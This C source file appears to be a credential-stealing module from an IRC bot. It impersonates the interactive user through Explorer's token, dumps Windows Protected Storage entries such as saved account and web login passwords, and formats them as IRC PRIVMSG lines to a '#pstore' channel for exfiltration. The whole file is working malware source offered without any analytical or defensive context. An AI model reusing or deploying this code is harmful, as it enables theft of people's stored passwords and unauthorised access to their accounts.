#include "includes.h"

	 char sendbuf[512];

DWORD GetExplorerProcessID (void)
{
	HANDLE hProcess;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD Explorer;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	BOOL success = FALSE;
	if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		return 0;
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++)
	{
		strncpy(szProcessName, "unknown", sizeof (szProcessName) - 1);
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if (NULL != hProcess) {
			if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
			{
				GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (lstrcmpi("Explorer.exe", szProcessName) == 0)
				{
					Explorer = aProcesses[i];
					i = cProcesses;
					return Explorer;
				}
			}
		}
	}
	return 0;
}

void ImpersonateInteractiveUser (void)
{
	HANDLE hToken=NULL;                
	HANDLE hProcess=NULL;
	DWORD processID=GetExplorerProcessID();
	if(processID)
	{
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,processID);
		if (hProcess)
		{
			if (OpenProcessToken(hProcess,TOKEN_QUERY|TOKEN_DUPLICATE,&hToken))
			{
				ImpersonateLoggedOnUser(hToken);
				CloseHandle(hToken);
			}
			CloseHandle(hProcess);
		}
	}
}


bool IsServiceRunning (char *name)
{
	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;
	SC_HANDLE handle = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	while (EnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			if (!strcmp(enumeration[i].lpServiceName,name))
			{
				if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
					return true;
				else
					return true;
			}
		}
		if (resumehandle == 0)
			break;
	}
	CloseServiceHandle(handle); 
	return false;
}

DWORD WINAPI pstore (LPVOID param)
{
	SOCKET sock;
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	ImpersonateInteractiveUser();
	typedef HRESULT (__stdcall *PSCI)(IPStore **, DWORD, DWORD, DWORD);
	PSCI fPStoreCreateInstance;
	HMODULE pstorec_dll = LoadLibrary("pstorec.dll");
    if (pstorec_dll)
		fPStoreCreateInstance = (PSCI)GetProcAddress(pstorec_dll,"PStoreCreateInstance");
	else
		return 0;
	if (!IsServiceRunning("ProtectedStorage"))
		return 0;
	int iSent=0;
	IPStorePtr PStore; 
	HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
	if (FAILED(hRes))
		return 0;
	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
	if (FAILED(hRes))
		return 0;
	GUID TypeGUID;
	char szItemName[512];
	char szItemData[512];
	char szResName[1512];
	char szResData[512];
	char szItemGUID[50];
	while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
	{
		wsprintf(szItemGUID,"%x",TypeGUID);
		IEnumPStoreTypesPtr EnumSubTypes;
		hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);
		GUID subTypeGUID;
		while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
		{
			IEnumPStoreItemsPtr spEnumItems;
			HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);
			LPWSTR itemName;
			while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
			{
				wsprintf(szItemName,"%ws",itemName);			 
				char chekingdata[200];
				unsigned long psDataLen = 0;
				unsigned char *psData = NULL;
				_PST_PROMPTINFO *pstiinfo = NULL;
				hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
				if(lstrlen((char *)psData)<(psDataLen-1))
				{
					int i=0;
					for(unsigned int m = 0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
							szItemData[i]=',';
						else
							szItemData[i]=psData[m];
						i++;
					}
					szItemData[i-1]=0;				  			
				}
				else
				{
					wsprintf(szItemData,"%s",psData);				  
				}	
				lstrcpy(szResName,"");
				lstrcpy(szResData,"");
				if (lstrcmp(szItemGUID,"5e7e8100")==0)
				{				  
					lstrcpy(chekingdata,"");
					if(strstr(szItemData,":")!=0)
					{
						lstrcpy(chekingdata,strstr(szItemData,":")+1);
						*(strstr(szItemData,":"))=0;				  
					}
					iSent++;
					if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
						sprintf(sendbuf,"PRIVMSG #pstore :pstore %s %s:%s \n",  szItemName, szItemData, chekingdata);
				}
				if (lstrcmp(szItemGUID,"e161255a")==0)
				{
					if (strstr(szItemName,"StringIndex")==0)
					{
						if(strstr(szItemName,":String")!=0)
							*strstr(szItemName,":String")=0;
						lstrcpyn(chekingdata,szItemName,8);			  
						if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
						{
							lstrcpy(chekingdata,"");
							if(strstr(szItemData,",")!=0)
							{
								lstrcpy(chekingdata,strstr(szItemData,",")+1);
								*(strstr(szItemData,","))=0;				  
							}
							iSent++;
							if ((strcmp(szItemData,"") && strcmp(chekingdata,"")))
						              sprintf(sendbuf,"PRIVMSG #pstore :pstore %s %s:%s \n",  szItemName, szItemData, chekingdata);
						}	
					}
				}
				ZeroMemory(szItemName,sizeof(szItemName));
				ZeroMemory(szItemData,sizeof(szItemData));
				Sleep (1000);
			}
		}
	}
	return 0;
}